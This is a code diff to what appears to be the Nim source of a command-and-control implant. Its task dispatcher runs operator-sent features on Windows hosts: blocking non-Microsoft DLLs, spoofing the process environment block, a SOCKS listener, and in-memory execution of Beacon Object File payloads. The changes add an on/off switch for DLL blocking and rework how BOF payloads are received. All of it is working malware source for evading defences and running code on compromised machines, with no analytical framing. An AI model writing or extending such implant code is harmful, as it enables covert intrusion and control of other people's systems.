@@ -548,11 +548,11 @@ when defined(windows):
     discard closesocket(listenSock); gSocksSocket = INVALID_SOCKET; return 0
 
   # ── Other Windows helpers ────────────────────────────────────────────────────
-  proc doBlockDlls(): string =
-    var policy: DWORD = 1
+  proc doBlockDlls(enable: bool): string =
+    var policy: DWORD = if enable: 1 else: 0
     if SetProcessMitigationPolicy(int32(8), cast[PVOID](addr policy), SIZE_T(sizeof(policy))) == 0:
       return "SetProcessMitigationPolicy failed (err " & $GetLastError() & ")"
-    return "[+] BLOCKDLLS enabled"
+    return if enable: "[+] BLOCKDLLS enabled" else: "[+] BLOCKDLLS disabled"
 
   proc doPebSpoof(newPath: string): string =
     if newPath.len == 0: return "empty path"
@@ -1721,7 +1721,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.sendResult(id, "", typ & ": not supported on Linux")
 
   of "BLOCKDLLS":
-    when defined(windows): t.sendResult(id, doBlockDlls(), "")
+    when defined(windows): t.sendResult(id, doBlockDlls(args.strip().toLowerAscii() != "off"), "")
     else: t.sendResult(id, "", "BLOCKDLLS: not supported on Linux")
 
   of "PEB_SPOOF":
@@ -2099,16 +2099,12 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "BOF":
     when defined(windows):
       try:
-        let j        = parseJson(args)
-        let coffB64  = j{"coff_b64"}.getStr()
-        let argsB64  = j{"args_b64"}.getStr()
-        if coffB64 == "":
-          t.sendResult(id, "", "BOF: missing coff_b64"); return
-        let coffStr  = base64.decode(coffB64)
-        let coffBytes = cast[seq[byte]](coffStr)
-        let argStr   = if argsB64.len > 0: base64.decode(argsB64) else: ""
-        let argBytes = cast[seq[byte]](argStr)
-        let output   = bofExec(coffBytes, argBytes)
+        if payload.len == 0:
+          t.sendResult(id, "", "BOF: missing COFF payload"); return
+        let argBytes: seq[byte] =
+          if args.len > 0: cast[seq[byte]](base64.decode(args))
+          else: @[]
+        let output = bofExec(payload, argBytes)
         t.sendResult(id, output, "")
       except: t.sendResult(id, "", "BOF: " & getCurrentExceptionMsg())
     else:
